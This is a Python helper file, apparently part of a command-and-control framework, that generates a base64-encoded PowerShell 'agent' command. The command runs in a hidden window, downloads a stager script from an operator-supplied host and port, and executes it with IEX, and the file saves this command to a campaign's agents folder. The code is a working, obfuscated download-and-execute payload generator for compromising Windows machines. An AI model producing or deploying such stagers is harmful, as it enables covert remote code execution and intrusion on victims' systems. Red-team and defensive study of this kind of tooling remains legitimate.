# core/helpers/powershell_agents.py
import os
import base64
import json

def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    
    # Extract campaign name from folder path
    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
    
    # Get the key information for documentation
    keys_file = os.path.join(campaign_folder, "keys.json")
    key_info = "Using campaign encryption key"
    
    if os.path.exists(keys_file):
        try:
            with open(keys_file, 'r') as f:
                keys_data = json.load(f)
            key_info = f"Using encryption key from keys.json"
        except Exception as e:
            key_info = f"Warning: Error reading keys file: {e}"
    
    http = "https" if ssl else "http"
    b64_stager = "/b64_stager"
    agent = f"$V=new-object net.webclient;$S=$V.DownloadString('{http}://{host}:{port}{b64_stager}');IEX($S)"
    encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
    powershell_command = f"powershell -w hidden \"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{encoded}')))\""
    
    result = f"Powershell Base64:\n{powershell_command}\n\nEncryption: {key_info}\nIdentity: Full system identification enabled"
    with open(os.path.join(agents_folder, "powershell_base64.txt"), "w") as f:
        f.write(result)
    
    return f"Powershell Base64 agent generated and saved to {os.path.join(agents_folder, 'powershell_base64.txt')}\n{result}"